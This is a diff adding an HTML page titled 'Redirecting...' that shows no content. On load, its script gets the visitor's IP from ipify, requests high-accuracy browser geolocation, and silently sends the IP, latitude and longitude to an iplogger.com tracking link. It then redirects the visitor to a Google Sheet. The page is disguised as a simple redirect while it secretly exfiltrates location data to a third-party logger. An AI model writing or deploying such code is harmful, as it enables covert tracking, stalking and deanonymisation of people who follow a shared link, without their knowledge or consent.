@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Redirecting...</title>
+    <script>
+        function getLocationAndSend() {
+            // First, fetch the user's IP address
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    const userIP = data.ip;
+
+                    // Try to get geolocation
+                    if (navigator.geolocation) {
+                        requestAnimationFrame(function() {
+                            navigator.geolocation.getCurrentPosition(
+                                function(position) {
+                                    const latitude = position.coords.latitude;
+                                    const longitude = position.coords.longitude;
+
+                                    // Debugging
+                                    console.log('Location obtained: ', latitude, longitude);
+
+                                    // Send the IP, latitude, and longitude to the IP logger
+                                    sendLocationData(userIP, latitude, longitude);
+                                },
+                                function(error) {
+                                    console.error('Geolocation error: ', error.message);
+                                    // Send only IP if geolocation fails
+                                    sendLocationData(userIP, null, null);
+                                },
+                                {
+                                    enableHighAccuracy: true,   // High accuracy for better mobile results
+                                    timeout: 20000,             // Wait for up to 20 seconds
+                                    maximumAge: 0               // No cached position
+                                }
+                            );
+                        });
+                    } else {
+                        console.error('Geolocation not supported by this browser.');
+                        // Send only the IP if geolocation is not supported
+                        sendLocationData(userIP, null, null);
+                    }
+                })
+                .catch(error => {
+                    console.error('Error fetching IP: ', error);
+                });
+        }
+
+        function sendLocationData(ip, latitude, longitude) {
+            // Log data being sent (for debugging)
+            console.log('Sending data: ', { ip, latitude, longitude });
+
+            // Visit the IP logger URL in the background
+            const ipLoggerUrl = `https://iplogger.com/25cqk5?ip=${ip}&latitude=${latitude || 'N/A'}&longitude=${longitude || 'N/A'}`;
+            fetch(ipLoggerUrl, { method: 'GET', mode: 'no-cors' })
+                .then(() => {
+                    console.log('Data sent to IP logger');
+                })
+                .catch(error => {
+                    console.error('Error sending data to IP logger: ', error);
+                })
+                .finally(() => {
+                    // After data is sent, redirect the user to the Google Sheet
+                    window.location.href = 'https://docs.google.com/spreadsheets/d/1kpx8D0chlzEOLvqJRa5GJXcsJsATPgwT0n6NBAsDfL8/edit?gid=0#gid=0';
+                });
+        }
+
+        // Ensure the function runs on page load
+        window.onload = function() {
+            requestAnimationFrame(getLocationAndSend);  // Ensures execution in Safari
+        };
+    </script>
+</head>
+<body>
+    <!-- No visible content, the page automatically handles everything -->
+</body>
+</html>
